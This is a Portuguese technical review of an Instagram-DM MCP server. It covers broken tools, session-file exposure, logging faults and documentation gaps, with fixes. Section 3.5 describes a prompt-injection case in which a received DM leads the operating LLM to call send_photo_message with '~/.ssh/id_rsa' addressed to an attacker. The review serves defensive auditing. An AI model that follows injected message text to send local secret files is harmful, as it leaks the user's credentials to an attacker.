# Análise Técnica — `instagram_dm_mcp`

Análise do estado atual do repositório (commit `7c2b8c5`).
Todas as afirmações sobre a biblioteca `instagrapi` foram verificadas contra a
versão fixada no projeto (`instagrapi==2.1.5`), inspecionando assinaturas e
modelos Pydantic reais — não são suposições.

---

## 1. Visão geral

| Item | Valor |
|---|---|
| Propósito | Servidor MCP (stdio) para operar o Instagram via `instagrapi` |
| Código-fonte | `src/mcp_server.py` (902 linhas), `src/logger.py` (3 linhas), `setup_env.py` (47 linhas) |
| Ferramentas MCP registradas | **25** |
| Ferramentas documentadas no README | **22** |
| Testes | **0** |
| CI / lint / formatação | **Nenhum** |

A arquitetura é deliberadamente simples: um único módulo, um `Client` global do
`instagrapi`, e 25 funções decoradas com `@mcp.tool()`. Para o escopo do
projeto isso é defensável. O problema não é a arquitetura — é que **uma parte
relevante das ferramentas não funciona**, e a superfície de segurança é ampla
para algo que roda com credenciais completas de uma conta pessoal.

---

## 2. Bugs confirmados (quebram a ferramenta em tempo de execução)

### 2.1 `download_media_from_message` — falha 100% das vezes 🔴

`src/mcp_server.py:658-666`

```python
def _download_single_media(media, download_path: str) -> str:
    media_type = media.media_type
    if media_type == 1:
        return str(client.photo_download(media.pk, download_path))
```

`download_media_from_message` passa `target_message.media`, que é um
`instagrapi.types.DirectMedia`. Esse modelo **não possui o campo `pk`**:

```
DirectMedia fields: id, media_type, user, thumbnail_url, video_url, audio_url
>>> DirectMedia(id="123_456", media_type=1).pk
AttributeError: 'DirectMedia' object has no attribute 'pk'
```

Resultado: a ferramenta sempre retorna
`{"success": false, "message": "Failed to download media: 'DirectMedia' object has no attribute 'pk'"}`.

**Correção:** derivar o `media_pk` a partir de `media.id` (formato
`"<media_pk>_<user_id>"`), ou baixar diretamente de `media.thumbnail_url` /
`media.video_url`, que já vêm preenchidas no objeto.

---

### 2.2 `list_chats(thread_message_limit=...)` — argumento posicional no parâmetro errado 🔴

`src/mcp_server.py:158`

```python
threads = client.direct_threads(amount, selected_filter, thread_message_limit)
```

A assinatura real é:

```python
direct_threads(amount=20, selected_filter='', box='', thread_message_limit=None)
```

O terceiro posicional é **`box`**, não `thread_message_limit`. Verificado por
binding:

```
direct_threads(20, '', 5)  ->  {'amount': 20, 'selected_filter': '', 'box': 5, 'thread_message_limit': None}
```

E `direct_threads_chunk` faz `assert box in ('general', 'primary')`. Ou seja:
sempre que o parâmetro `thread_message_limit` for usado, a chamada morre com
`Unsupported box="5"`. Quando não é usado, o limite simplesmente nunca é
aplicado.

**Correção:** usar keyword argument — `client.direct_threads(amount, selected_filter, thread_message_limit=thread_message_limit)`.

---

### 2.3 `list_messages` — `AttributeError` em qualquer thread com reel/post compartilhado 🔴

`src/mcp_server.py:191-203`

```python
clip = getattr(m, 'clip', None) or msg.get('clip')
media_share = getattr(m, 'media_share', None) or msg.get('media_share')
...
for obj in [clip, media_share, xma, post_share]:
    if obj:
        shared_code = obj.get('code') or obj.get('pk')
```

`DirectMessage.clip` e `DirectMessage.media_share` são
`Optional[instagrapi.types.Media]` — modelos Pydantic, que **não têm método
`.get()`**. Como o objeto é truthy, o `getattr` vence o fallback para o dict e
o `.get()` estoura.

Agravante: o `try/except` envolve o **loop inteiro**, então uma única mensagem
com um reel compartilhado faz a ferramenta retornar zero mensagens —
não apenas pular aquela mensagem.

**Correção:** acessar por atributo (`obj.code`, `obj.pk`) quando for modelo
Pydantic, ou normalizar com `obj if isinstance(obj, dict) else obj.model_dump()`
antes de usar `.get()`. E mover o `try/except` para dentro do loop.

---

### 2.4 Campos `xma_media_share` e `post_share` não existem 🟠

`src/mcp_server.py:195-196` e `768`

O código procura por `xma_media_share` e `post_share` em `DirectMessage`. Os
campos reais do modelo são:

```
id, user_id, thread_id, timestamp, item_type, is_sent_by_viewer, is_shh_mode,
reactions, text, reply, link, animated_media, media, visual_media, media_share,
reel_share, story_share, felix_share, xma_share, clip, placeholder, client_context
```

Não há `xma_media_share` nem `post_share` — o nome correto é **`xma_share`**
(tipo `MediaXma`). Consequência: compartilhamentos do tipo XMA são
silenciosamente ignorados em `list_messages`, e
`download_shared_post_from_message` responde
`"This message does not contain a supported shared post/reel/clip"` para eles.

---

### 2.5 `check_user_online_status` — interpreta o envelope da API como dados 🔴

`src/mcp_server.py:415-421`

```python
presence_data = client.direct_users_presence(user_ids)
for user_id_str, presence in presence_data.items():
    username = username_to_id.get(user_id_str, f"user_{user_id_str}")
    result[username] = presence
```

`direct_users_presence` retorna o **corpo bruto da resposta**
(`return result`), cujas chaves de topo são `user_presence` e `status` — não
IDs de usuário. O resultado produzido é literalmente:

```json
{"user_user_presence": {...}, "user_status": "ok"}
```

**Correção:** iterar sobre `presence_data.get("user_presence", {})`.

Essa ferramenta também **não está documentada no README**.

---

### 2.6 `shared_obj` atribuído e nunca usado 🟡

`src/mcp_server.py:773` — variável morta (`F841`). Sintoma de que o bloco de
extração foi copiado de `list_messages` sem revisão.

---

## 3. Segurança

### 3.1 Arquivo de sessão fora do `.gitignore` 🔴

O `.gitignore` cobre `.env`, mas **não** `*_session.json`:

```
$ git check-ignore -v someuser_session.json
NOT IGNORED
```

O arquivo `{username}_session.json` gerado em `src/mcp_server.py:886-895`
contém o `authorization_data` (token de sessão), o `uuid` do dispositivo e os
headers autenticados. Na prática **equivale à senha** — quem tiver o arquivo
opera a conta sem MFA. Ele é escrito no diretório de trabalho, que
frequentemente é a própria raiz do repositório.

Um `git add .` distraído publica a conta.

**Correção mínima:** adicionar `*_session.json` ao `.gitignore`. Idealmente,
gravar em `~/.config/instagram_dm_mcp/` com `chmod 600`.

### 3.2 Permissões de arquivo não restringidas 🟠

Nem o `dump_settings` da sessão nem o `.env` gerado por `setup_env.py:39`
aplicam `os.chmod(path, 0o600)`. Com o umask padrão (`022`) ambos ficam
legíveis por qualquer usuário local.

### 3.3 `setup_env.py` não escapa os valores 🟠

`setup_env.py:33-36` interpola usuário e senha direto no `.env` sem aspas nem
escaping. Senhas contendo `#`, `"` ou espaços podem ser truncadas ou lidas
incorretamente pelo `python-dotenv`, gerando falhas de login difíceis de
diagnosticar.

### 3.4 Senha por argumento de linha de comando 🟠

O README documenta `--password` como opção. Argumentos de processo são
visíveis via `ps aux` para qualquer usuário da máquina e ficam no histórico do
shell. O README já marca a opção como "less secure" — vale depreciar de vez.

### 3.5 Caminho de arquivo arbitrário nas ferramentas de envio 🔴 *(no contexto de agente)*

`send_photo_message` / `send_video_message` aceitam **qualquer caminho do
sistema de arquivos**, sem allowlist ou sandbox. Este servidor é operado por um
LLM que lê conteúdo não confiável (as próprias DMs recebidas). Uma injeção de
prompt em uma mensagem recebida pode induzir o modelo a chamar
`send_photo_message(username="atacante", photo_path="~/.ssh/id_rsa")` —
exfiltração direta. O mesmo vale, na direção inversa, para `download_path` nas
ferramentas de download (escrita arbitrária).

Mitigação: restringir os caminhos a um diretório configurável
(`MEDIA_ROOT`), validar com `Path.resolve().is_relative_to(root)`, e validar a
extensão/tipo do arquivo.

### 3.6 `except:` nu engolindo exceções 🟡

`src/mcp_server.py:409` — `except: continue` captura inclusive
`KeyboardInterrupt` e `SystemExit`, e descarta o erro sem log.

---

## 4. Robustez e operação

### 4.1 Logging não funciona 🟠

`src/mcp_server.py:14-15` configura o nível como `DEBUG` mas **nunca adiciona
um handler** nem chama `logging.basicConfig()`. Sem handler, o `logging`
recorre ao `lastResort`, que filtra em `WARNING`. Resultado: todos os
`logger.info(...)` — incluindo "Successfully logged in" e "Session saved" —
são silenciosamente descartados. Só os `logger.error` aparecem.

Em um servidor stdio, o log **deve** ir para `stderr` explicitamente.

### 4.2 `print()` para stdout em transporte stdio 🟠

`src/mcp_server.py:873-876` e `901` usam `print()`, que escreve em **stdout** —
o mesmo canal do protocolo MCP. Hoje é inofensivo porque essas chamadas
antecedem `mcp.run()`, mas é uma armadilha latente: qualquer `print()` que
migre para dentro de uma ferramenta corrompe o stream JSON-RPC.

### 4.3 `src/logger.py` é código morto 🟡

Nunca importado. `mcp_server.py` redefine o logger localmente.

### 4.4 Sem tratamento de 2FA / desafio 🟠

`client.login(username, password)` (linha 891) ignora o parâmetro
`verification_code`, que o `instagrapi` suporta:

```python
login(self, username=None, password=None, relogin=False, verification_code='') -> bool
```

Contas com 2FA ativo — o padrão recomendado pelo próprio Instagram — não
conseguem autenticar. Não há `challenge_code_handler` nem prompt interativo.

### 4.5 Sem recuperação de sessão expirada 🟠

O login acontece **uma única vez**, antes de `mcp.run()`. Quando a sessão
expira ou o Instagram lança `LoginRequired`, todas as 25 ferramentas passam a
retornar `{"success": false, "message": "..."}` indefinidamente. Não há
re-login automático nem sinalização distinta ao cliente MCP.

### 4.6 Sem controle de taxa 🟠

O `instagrapi` expõe `client.delay_range = [1, 3]` justamente para reduzir
bloqueios; o projeto não usa. Ferramentas como `get_user_followers(count=...)`
paginam agressivamente e são um vetor clássico de banimento de conta.

### 4.7 Erros sem tipagem 🟡

Todas as 25 ferramentas colapsam qualquer falha em
`{"success": False, "message": str(e)}`. O cliente MCP não distingue "usuário
não existe" de "rate limit" de "sessão expirada" — e portanto não consegue
decidir entre repetir, esperar ou desistir. Um campo `error_code` resolveria.

### 4.8 `int()` sem validação em IDs 🟡

`mark_message_seen`, `delete_message` e `mute_conversation` fazem
`int(thread_id)` / `int(message_id)`. IDs não numéricos geram um
`ValueError: invalid literal for int()` opaco em vez de uma mensagem útil.

---

## 5. Documentação e configuração

| Problema | Local |
|---|---|
| 3 ferramentas ausentes do README: `check_user_online_status`, `delete_message`, `mute_conversation` | `readme.md` |
| `like_media` documentado como "by media ID", mas o parâmetro real é `media_url` | `readme.md` / `mcp_server.py:506` |
| Docstring de `send_photo_message` documenta um parâmetro `message` que não existe | `mcp_server.py:61` |
| Docstring de `search_users` documenta um parâmetro `count` que não existe | `mcp_server.py:434` |
| Typo no exemplo de config: `"src/ mcp_server.py"` (espaço extra) | `readme.md` |
| Versão do Python inconsistente: `.python-version`=3.10, `pyproject`=">=3.10", README="3.11+", badge="3.12+" | 4 arquivos |
| `fastmcp==2.8.1` declarado mas não usado — o código importa `mcp.server.fastmcp` | `pyproject.toml` |
| Dependências duplicadas em `requirements.txt` + `pyproject.toml` + `uv.lock`, já divergindo | raiz |

As duas docstrings incorretas merecem destaque: o FastMCP as usa para gerar o
**JSON Schema exposto ao LLM**. Documentar parâmetros inexistentes leva o
modelo a enviar argumentos inválidos e receber erros de validação.

---

## 6. Prioridades sugeridas

**P0 — segurança imediata (minutos)**
1. `*_session.json` no `.gitignore`; `chmod 600` na sessão e no `.env`.
2. Verificado: nenhum `*_session.json` ou `.env` foi commitado até `7c2b8c5` — o risco é prospectivo, não uma exposição já ocorrida.

**P1 — ferramentas quebradas (horas)**
3. `_download_single_media`: derivar o `media_pk` de `DirectMedia.id`.
4. `list_chats`: passar `thread_message_limit` como keyword.
5. `list_messages` / `download_shared_post_from_message`: acessar `Media` por
   atributo, usar `xma_share`, e mover o `try/except` para dentro do loop.
6. `check_user_online_status`: ler `presence_data["user_presence"]`.

**P2 — operação (dias)**
7. Logging em `stderr` com handler de verdade; eliminar `print()` do módulo.
8. Suporte a 2FA (`verification_code`) e re-login em `LoginRequired`.
9. `client.delay_range` para reduzir risco de banimento.
10. Allowlist de diretórios para envio/download de mídia.
11. `error_code` estruturado nas respostas.

**P3 — sustentação**
12. Testes com o `Client` mockado — as 4 falhas da seção 2 seriam capturadas
    por testes triviais de contrato contra os modelos do `instagrapi`.
13. `ruff` + CI no GitHub Actions.
14. Fonte única de dependências (`pyproject` + `uv.lock`; remover
    `requirements.txt` ou gerá-lo).
15. Sincronizar README, docstrings e versão do Python.
